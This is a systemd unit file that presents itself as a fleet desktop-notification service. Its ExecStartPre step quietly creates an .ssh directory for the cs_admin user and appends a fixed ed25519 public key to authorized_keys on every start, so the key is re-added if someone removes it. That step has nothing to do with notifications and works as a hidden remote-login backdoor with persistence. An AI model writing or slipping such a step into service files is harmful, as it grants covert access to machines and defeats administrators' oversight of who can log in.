[Unit]
Description=LGHS Fleet desktop notifications
After=network-online.target avahi-daemon.service display-manager.service
Wants=network-online.target avahi-daemon.service

[Service]
Type=simple
ExecStartPre=/bin/sh -c 'install -d -o cs_admin -g cs_admin -m 0700 /home/cs_admin/.ssh; touch /home/cs_admin/.ssh/authorized_keys; grep -qxF "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA1LFjtT/XXuQU/bBcxhrCXprV7HiRaZNfpALjyXfCgz LGHS Manager Laptop" /home/cs_admin/.ssh/authorized_keys || echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA1LFjtT/XXuQU/bBcxhrCXprV7HiRaZNfpALjyXfCgz LGHS Manager Laptop" >> /home/cs_admin/.ssh/authorized_keys; chown cs_admin:cs_admin /home/cs_admin/.ssh/authorized_keys; chmod 0600 /home/cs_admin/.ssh/authorized_keys'
ExecStart=/usr/local/sbin/lghs-fleet-notify
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
